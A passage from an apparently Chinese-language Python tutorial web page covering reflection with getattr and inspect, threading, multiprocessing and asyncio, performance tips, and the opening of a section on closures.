href="#示例：使用-getattr-、setattr-和-hasattr" class="headerlink" title="示例：使用 getattr()、setattr() 和 hasattr()"></a>示例：使用 <code>getattr()</code>、<code>setattr()</code> 和 <code>hasattr()</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = <span class="string">&quot;Alice&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象</span></span><br><span class="line">obj = MyClass()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取属性值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">getattr</span>(obj, <span class="string">&#x27;name&#x27;</span>))  <span class="comment"># 输出：Alice</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置属性值</span></span><br><span class="line"><span class="built_in">setattr</span>(obj, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;Bob&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">getattr</span>(obj, <span class="string">&#x27;name&#x27;</span>))  <span class="comment"># 输出：Bob</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查属性是否存在</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(obj, <span class="string">&#x27;name&#x27;</span>))  <span class="comment"># 输出：True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(obj, <span class="string">&#x27;age&#x27;</span>))   <span class="comment"># 输出：False</span></span><br></pre></td></tr></table></figure><p>在这个例子中：</p><ul><li><code>getattr(obj, &#39;name&#39;)</code> 用来获取<code>obj</code>对象的<code>name</code>属性。</li><li><code>setattr(obj, &#39;name&#39;, &#39;Bob&#39;)</code> 用来设置<code>obj</code>对象的<code>name</code>属性值为<code>Bob</code>。</li><li><code>hasattr(obj, &#39;name&#39;)</code> 检查<code>obj</code>是否有<code>name</code>属性。</li></ul><h3 id="动态调用方法"><a href="#动态调用方法" class="headerlink" title="动态调用方法"></a>动态调用方法</h3><p>反射不仅可以操作属性，还可以动态调用对象的方法。通过<code>getattr()</code>，可以在运行时获取并调用对象的方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Hello, <span class="subst">&#123;name&#125;</span>!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象</span></span><br><span class="line">obj = MyClass()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 动态调用方法</span></span><br><span class="line">method_name = <span class="string">&#x27;greet&#x27;</span></span><br><span class="line"><span class="built_in">getattr</span>(obj, method_name)(<span class="string">&#x27;Alice&#x27;</span>)  <span class="comment"># 输出：Hello, Alice!</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>getattr(obj, method_name)</code>返回<code>greet</code>方法，并动态调用它。</p><h3 id="使用-inspect-模块获取对象的详细信息"><a href="#使用-inspect-模块获取对象的详细信息" class="headerlink" title="使用 inspect 模块获取对象的详细信息"></a>使用 <code>inspect</code> 模块获取对象的详细信息</h3><p>Python的<code>inspect</code>模块提供了一些函数，可以帮助开发者在运行时检查对象的结构、方法和参数等信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Hello, <span class="subst">&#123;name&#125;</span>!&quot;</span>)</span><br><span class="line"></span><br><span class="line">params = inspect.signature(MyClass.greet).parameters</span><br><span class="line"><span class="built_in">print</span>(params)</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>inspect.signature()</code>方法获取了<code>greet</code>方法的参数信息，输出的是方法的签名和参数。</p><h2 id="元编程与反射的应用场景"><a href="#元编程与反射的应用场景" class="headerlink" title="元编程与反射的应用场景"></a>元编程与反射的应用场景</h2><h3 id="动态生成类和方法"><a href="#动态生成类和方法" class="headerlink" title="动态生成类和方法"></a>动态生成类和方法</h3><p>元编程可以用于根据需求动态生成类和方法。比如，开发一个框架，它需要根据不同的配置动态创建类，或者在运行时根据不同条件生成不同的方法。</p><h3 id="动态修改类的行为"><a href="#动态修改类的行为" class="headerlink" title="动态修改类的行为"></a>动态修改类的行为</h3><p>反射使得程序可以在运行时修改类的属性和方法。例如，某些功能需要在运行时调整对象的行为，这时候可以使用反射修改类的属性，甚至为对象添加新的方法。</p><h3 id="插件架构"><a href="#插件架构" class="headerlink" title="插件架构"></a>插件架构</h3><p>元编程和反射常用于实现插件架构。在这种架构中，主程序通过反射动态加载插件，而插件不需要在主程序中硬编码。插件可以在运行时被动态加载、卸载或更新。</p><h3 id="调试和测试工具"><a href="#调试和测试工具" class="headerlink" title="调试和测试工具"></a>调试和测试工具</h3><p>反射能够帮助调试工具或测试框架检查对象的状态、方法、成员等。例如，测试框架通过反射自动发现并运行测试方法，而不需要显式地列出每个方法的名称。</p><hr><h1 id="并发编程"><a href="#并发编程" class="headerlink" title="并发编程"></a>并发编程</h1><h2 id="并发编程简介"><a href="#并发编程简介" class="headerlink" title="并发编程简介"></a>并发编程简介</h2><p><strong>并发编程</strong>是指在程序中同时执行多个任务，以提高程序的效率，充分利用计算机的多核处理能力。并发编程的核心目标是通过并行或并发执行任务，优化程序的性能，尤其是在处理I&#x2F;O密集型或CPU密集型任务时。</p><p>Python通过多种方式支持并发编程，最常见的方式是<strong>多线程（Multithreading）</strong>、**多进程（Multiprocessing）<strong><strong>和</strong></strong>异步编程（Asynchronous Programming）**。每种方式有其适用的场景和优势。</p><h2 id="多线程（Multithreading）-1"><a href="#多线程（Multithreading）-1" class="headerlink" title="多线程（Multithreading）"></a>多线程（Multithreading）</h2><p>多线程是指在同一个进程中创建多个线程，每个线程执行一个任务。线程之间共享进程的内存空间，因此它们可以更高效地通信，但需要注意线程同步问题。</p><h3 id="Python中的线程"><a href="#Python中的线程" class="headerlink" title="Python中的线程"></a>Python中的线程</h3><p>Python通过<code>threading</code>模块支持多线程。虽然Python的全局解释器锁（GIL）限制了多线程在CPU密集型任务中的并行性，但它仍然适用于I&#x2F;O密集型任务。</p><h4 id="示例：使用threading模块创建线程"><a href="#示例：使用threading模块创建线程" class="headerlink" title="示例：使用threading模块创建线程"></a>示例：使用<code>threading</code>模块创建线程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Thread <span class="subst">&#123;name&#125;</span> started&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Thread <span class="subst">&#123;name&#125;</span> finished&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建并启动多个线程</span></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    t = threading.Thread(target=task, args=(i,))</span><br><span class="line">    threads.append(t)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待所有线程完成</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure><p>在这个例子中，创建了三个线程，每个线程都执行<code>task</code>函数。<code>join()</code>方法确保主线程在所有子线程完成之前不会退出。</p><h3 id="线程的优缺点"><a href="#线程的优缺点" class="headerlink" title="线程的优缺点"></a>线程的优缺点</h3><ul><li><strong>优点</strong>：<ul><li>适用于I&#x2F;O密集型任务（如文件读写、网络请求等），能够在等待I&#x2F;O操作时并发执行其他任务。</li><li>线程之间的通信比进程间通信更简单，因为它们共享内存。</li></ul></li><li><strong>缺点</strong>：<ul><li>由于GIL的存在，线程在执行CPU密集型任务时无法充分利用多核CPU。</li><li>线程共享内存，容易出现数据竞争和死锁问题。</li></ul></li></ul><h2 id="多进程（Multiprocessing）-1"><a href="#多进程（Multiprocessing）-1" class="headerlink" title="多进程（Multiprocessing）"></a>多进程（Multiprocessing）</h2><p>多进程是指创建多个进程来并行执行任务，每个进程都有独立的内存空间和资源。进程间相互独立，因此它们不会像线程那样出现共享内存的问题。</p><h3 id="Python中的多进程"><a href="#Python中的多进程" class="headerlink" title="Python中的多进程"></a>Python中的多进程</h3><p>Python通过<code>multiprocessing</code>模块支持多进程。由于每个进程有独立的内存空间，因此多进程可以避免GIL的限制，适用于CPU密集型任务。</p><h4 id="示例：使用multiprocessing模块创建进程"><a href="#示例：使用multiprocessing模块创建进程" class="headerlink" title="示例：使用multiprocessing模块创建进程"></a>示例：使用<code>multiprocessing</code>模块创建进程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Process <span class="subst">&#123;name&#125;</span> started&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Process <span class="subst">&#123;name&#125;</span> finished&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建并启动多个进程</span></span><br><span class="line">processes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p = multiprocessing.Process(target=task, args=(i,))</span><br><span class="line">    processes.append(p)</span><br><span class="line">    p.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待所有进程完成</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">    p.join()</span><br></pre></td></tr></table></figure><p>在这个例子中，创建了三个进程，每个进程执行<code>task</code>函数。进程之间相互独立，因此它们不会影响彼此的内存空间。</p><h3 id="多进程的优缺点"><a href="#多进程的优缺点" class="headerlink" title="多进程的优缺点"></a>多进程的优缺点</h3><ul><li><strong>优点</strong>：<ul><li>可以充分利用多核CPU，适用于CPU密集型任务（如大规模计算、数据处理等）。</li><li>进程之间独立，避免了线程共享内存的复杂性。</li></ul></li><li><strong>缺点</strong>：<ul><li>进程之间的通信较为复杂，需要使用<code>Queue</code>、<code>Pipe</code>等进程间通信机制。</li><li>创建和管理进程的开销比线程大，因此在启动多个进程时需要谨慎。</li></ul></li></ul><h2 id="异步编程（Asynchronous-Programming）"><a href="#异步编程（Asynchronous-Programming）" class="headerlink" title="异步编程（Asynchronous Programming）"></a>异步编程（Asynchronous Programming）</h2><p>异步编程是一种不同于传统同步编程的编程方式，它允许程序在等待某些操作（如I&#x2F;O操作）时继续执行其他任务，而无需阻塞程序的执行。Python的<code>asyncio</code>模块提供了异步编程的核心支持。</p><h3 id="Python中的异步编程"><a href="#Python中的异步编程" class="headerlink" title="Python中的异步编程"></a>Python中的异步编程</h3><p>Python的<code>asyncio</code>模块使得编写异步代码变得更加容易。通过<code>async</code>和<code>await</code>关键字，开发者可以定义异步函数并执行异步任务。</p><h4 id="示例：使用asyncio实现异步编程"><a href="#示例：使用asyncio实现异步编程" class="headerlink" title="示例：使用asyncio实现异步编程"></a>示例：使用<code>asyncio</code>实现异步编程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Task <span class="subst">&#123;name&#125;</span> started&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)  <span class="comment"># 模拟I/O操作</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Task <span class="subst">&#123;name&#125;</span> finished&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    tasks = [task(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行异步任务</span></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>task</code>是一个异步函数，<code>await asyncio.sleep(2)</code>模拟了一个耗时的I&#x2F;O操作。通过<code>asyncio.gather()</code>可以并发执行多个异步任务。</p><h3 id="异步编程的优缺点"><a href="#异步编程的优缺点" class="headerlink" title="异步编程的优缺点"></a>异步编程的优缺点</h3><ul><li><strong>优点</strong>：<ul><li>适用于I&#x2F;O密集型任务，能够在等待I&#x2F;O操作时执行其他任务，显著提高程序效率。</li><li>相比线程和进程，异步编程的开销较小，因为它不需要创建和管理多个线程或进程。</li></ul></li><li><strong>缺点</strong>：<ul><li>异步编程的逻辑较为复杂，调试和维护比传统的同步编程更加困难。</li><li>仅适用于I&#x2F;O密集型任务，对于CPU密集型任务并不能提高性能。</li></ul></li></ul><h2 id="Python中的并发编程模型选择"><a href="#Python中的并发编程模型选择" class="headerlink" title="Python中的并发编程模型选择"></a>Python中的并发编程模型选择</h2><p>在Python中，可以根据任务的性质选择不同的并发编程模型：</p><h3 id="1-多线程"><a href="#1-多线程" class="headerlink" title="1. 多线程"></a>1. <strong>多线程</strong></h3><ul><li><strong>适用场景</strong>：I&#x2F;O密集型任务，如网络请求、文件读写等。</li><li><strong>优点</strong>：线程之间共享内存，通信开销较小。</li><li><strong>缺点</strong>：由于GIL的限制，不能有效提高CPU密集型任务的性能。</li></ul><h3 id="2-多进程"><a href="#2-多进程" class="headerlink" title="2. 多进程"></a>2. <strong>多进程</strong></h3><ul><li><strong>适用场景</strong>：CPU密集型任务，如大规模计算、数据处理等。</li><li><strong>优点</strong>：可以充分利用多核CPU。</li><li><strong>缺点</strong>：进程间通信复杂，创建和管理进程的开销较大。</li></ul><h3 id="3-异步编程"><a href="#3-异步编程" class="headerlink" title="3. 异步编程"></a>3. <strong>异步编程</strong></h3><ul><li><strong>适用场景</strong>：I&#x2F;O密集型任务，尤其是大量并发I&#x2F;O操作的场景。</li><li><strong>优点</strong>：无需创建线程或进程，开销较小，适用于大量并发I&#x2F;O操作。</li><li><strong>缺点</strong>：调试复杂，代码较难理解和维护。</li></ul><hr><h1 id="单元测试与测试框架"><a href="#单元测试与测试框架" class="headerlink" title="单元测试与测试框架"></a>单元测试与测试框架</h1><hr><h1 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h1><h2 id="使用合适的数据结构"><a href="#使用合适的数据结构" class="headerlink" title="使用合适的数据结构"></a>使用合适的数据结构</h2><p>数据结构的选择对性能影响巨大。标准库中的一些内建结构和模块比手动实现更高效。</p><h3 id="使用set代替list查找"><a href="#使用set代替list查找" class="headerlink" title="使用set代替list查找"></a>使用<code>set</code>代替<code>list</code>查找</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 差</span></span><br><span class="line"><span class="keyword">if</span> item <span class="keyword">in</span> my_list: ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 好</span></span><br><span class="line"><span class="keyword">if</span> item <span class="keyword">in</span> my_set: ...</span><br></pre></td></tr></table></figure><p>集合（<code>set</code>）的查找是哈希结构，平均时间复杂度是 O(1)，而列表是 O(n)。</p><h3 id="使用collections模块"><a href="#使用collections模块" class="headerlink" title="使用collections模块"></a>使用<code>collections</code>模块</h3><ul><li><code>deque</code>：双端队列，适合频繁的头尾插入和删除。</li><li><code>defaultdict</code>：自动初始化字典值，避免键不存在的判断。</li><li><code>Counter</code>：高效地统计元素频次。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">data = [<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;apple&quot;</span>]</span><br><span class="line">counter = Counter(data)</span><br><span class="line"><span class="built_in">print</span>(counter[<span class="string">&quot;apple&quot;</span>])  <span class="comment"># 输出：2</span></span><br></pre></td></tr></table></figure><hr><h2 id="避免不必要的循环和计算"><a href="#避免不必要的循环和计算" class="headerlink" title="避免不必要的循环和计算"></a>避免不必要的循环和计算</h2><h3 id="使用生成式替代显式循环"><a href="#使用生成式替代显式循环" class="headerlink" title="使用生成式替代显式循环"></a>使用生成式替代显式循环</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 差</span></span><br><span class="line">squares = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    squares.append(i * i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 好</span></span><br><span class="line">squares = [i * i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]</span><br></pre></td></tr></table></figure><h3 id="使用生成器避免内存爆炸"><a href="#使用生成器避免内存爆炸" class="headerlink" title="使用生成器避免内存爆炸"></a>使用生成器避免内存爆炸</h3><p>列表会一次性加载所有元素，占用大量内存。生成器按需生成，节省资源。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 差：占用内存</span></span><br><span class="line">nums = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 好：节省内存</span></span><br><span class="line">nums = (i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>))</span><br></pre></td></tr></table></figure><hr><h2 id="减少全局变量的访问"><a href="#减少全局变量的访问" class="headerlink" title="减少全局变量的访问"></a>减少全局变量的访问</h2><p>函数内部访问局部变量比访问全局变量快，Python 会优先从局部命名空间查找变量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 差</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        x = GLOBAL_VALUE * i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 好</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute</span>():</span><br><span class="line">    local = GLOBAL_VALUE</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        x = local * i</span><br></pre></td></tr></table></figure><hr><h2 id="内置函数与库优先"><a href="#内置函数与库优先" class="headerlink" title="内置函数与库优先"></a>内置函数与库优先</h2><p>Python 的内置函数是用 C 语言实现的，效率通常比手写循环高。常见函数包括：</p><ul><li><code>sum()</code></li><li><code>max()</code> &#x2F; <code>min()</code></li><li><code>sorted()</code></li><li><code>map()</code> &#x2F; <code>filter()</code></li><li><code>zip()</code> &#x2F; <code>enumerate()</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 差</span></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">    total += num</span><br><span class="line"></span><br><span class="line"><span class="comment"># 好</span></span><br><span class="line">total = <span class="built_in">sum</span>(nums)</span><br></pre></td></tr></table></figure><hr><h2 id="使用itertools进行高效迭代"><a href="#使用itertools进行高效迭代" class="headerlink" title="使用itertools进行高效迭代"></a>使用<code>itertools</code>进行高效迭代</h2><p><code>itertools</code>模块提供了一批高效的迭代工具，支持惰性求值，适合处理大数据流。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> islice</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取前10个元素，无需生成整个序列</span></span><br><span class="line">result = islice((x * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>)), <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(result))</span><br></pre></td></tr></table></figure><hr><h2 id="函数缓存"><a href="#函数缓存" class="headerlink" title="函数缓存"></a>函数缓存</h2><p>对重复调用且参数相同的函数可以使用缓存，提高效率。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> lru_cache</span><br><span class="line"></span><br><span class="line"><span class="meta">@lru_cache(<span class="params">maxsize=<span class="number">128</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">return</span> fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><code>@lru_cache</code> 是内置的装饰器，用于自动缓存函数的返回值，避免重复计算。</p><hr><h2 id="利用多进程与多线程"><a href="#利用多进程与多线程" class="headerlink" title="利用多进程与多线程"></a>利用多进程与多线程</h2><p>在 CPU 密集型任务中使用<strong>多进程</strong>（<code>multiprocessing</code>），在 I&#x2F;O 密集型任务中使用<strong>多线程</strong>（<code>threading</code>）或<strong>异步编程</strong>（<code>asyncio</code>）来提升程序吞吐能力。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">work</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x * x</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> Pool(<span class="number">4</span>) <span class="keyword">as</span> p:</span><br><span class="line">    result = p.<span class="built_in">map</span>(work, <span class="built_in">range</span>(<span class="number">1000</span>))</span><br></pre></td></tr></table></figure><hr><h2 id="使用-Cython、Numba-等工具加速计算"><a href="#使用-Cython、Numba-等工具加速计算" class="headerlink" title="使用 Cython、Numba 等工具加速计算"></a>使用 Cython、Numba 等工具加速计算</h2><p>当 Python 本身难以再优化时，可以考虑使用 C 扩展、JIT 编译等方式提高执行速度。</p><ul><li><code>Cython</code>：将 Python 编译为 C，提高运行速度。</li><li><code>Numba</code>：JIT 编译 Python 代码，自动优化数值计算函数。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numba <span class="keyword">import</span> jit</span><br><span class="line"></span><br><span class="line"><span class="meta">@jit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fast_add</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure><hr><h2 id="使用合适的文件与数据格式"><a href="#使用合适的文件与数据格式" class="headerlink" title="使用合适的文件与数据格式"></a>使用合适的文件与数据格式</h2><ul><li>文本格式（如 CSV）处理慢，适合用作人类可读。</li><li>二进制格式（如 <code>pickle</code>、<code>protobuf</code>、<code>parquet</code>）在性能和体积上更优。</li><li>大数据处理可使用 <code>pandas</code> 加载高效的数据格式。</li></ul><hr><h2 id="分析工具与性能监控"><a href="#分析工具与性能监控" class="headerlink" title="分析工具与性能监控"></a>分析工具与性能监控</h2><p>优化前，先找到慢的地方。推荐使用以下工具定位性能瓶颈：</p><ul><li><code>timeit</code>：测试小段代码运行时间。</li><li><code>cProfile</code>：分析程序中各函数的耗时。</li><li><code>line_profiler</code>：按行查看函数的性能。</li></ul><hr><h1 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h1><h2 id="闭包的概念"><a href="#闭包的概念" class="headerlink" title="闭包的概念"></a>闭包的概念</h2><p>**闭包（Closure）**是函数式编程中的一个重要概念。简单来说，闭包是指一个函数能够“记住”并访问它定义时的作用域，即使在外部函数已经执行完毕后，内部函数仍然能够访问外部函数的局部变量。</p><p>闭包是通过将函数作为返回值返回来实现的。它不仅仅是一个普通的返回函数，而是包含了对外部作用域的引用。</p><h3 id="闭包的构成"><a href="#闭包的构成" class="headerlink" title="闭包的构成"></a>闭包的构成</h3><p>一个闭包包含三个部分：</p><ol><li><strong>外部函数</strong>：闭包是由外部函数创建的。</li><li><strong>内部函数</strong>：在外部函数内部定义的函数。</li><li><strong>自由变量（Free variables）</strong>：外部函数中的局部变量，内部函数仍能访问它们，称为自由变量。</li></ol><hr><h2 id="闭包的特点"><a href="#闭包的特点" class="headerlink" title="闭包的特点"></a>闭包的特点</h2><ul><li>内部函数引用了外部函数的局部变量。</li><li>外部函数返回了内部函数的引用，使得外部函数的局部变量能“保留”下来。</li><li>闭包可以访问外部函数的变量，即使外部函数已经执行结束。</li></ul><hr><h2 id="闭包的示例"><a href="#闭包的示例" class="headerlink" title="闭包的示例"></a>闭包的示例</h2><h3 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">outer</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span 